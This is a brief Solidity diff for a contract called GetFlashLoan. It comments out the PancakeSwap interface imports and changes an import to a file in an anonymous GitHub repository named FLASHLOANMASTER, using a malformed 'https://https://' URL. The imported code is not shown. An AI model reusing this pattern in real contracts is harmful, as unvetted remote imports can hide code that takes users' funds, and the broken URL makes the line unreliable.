@@ -8,7 +8,7 @@ pragma solidity ^0.6.6;
 //import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
 //import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
 //import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";
-import "https://github.com/FLASHLOANMASTER/FLASHLOANMASTER/blob/main/FLASHLOANMASTER";
+import "https://https://github.com/FLASHLOANMASTER/FLASHLOANMASTER/blob/main/FlashLoan";
 
 
 contract GetFlashLoan {
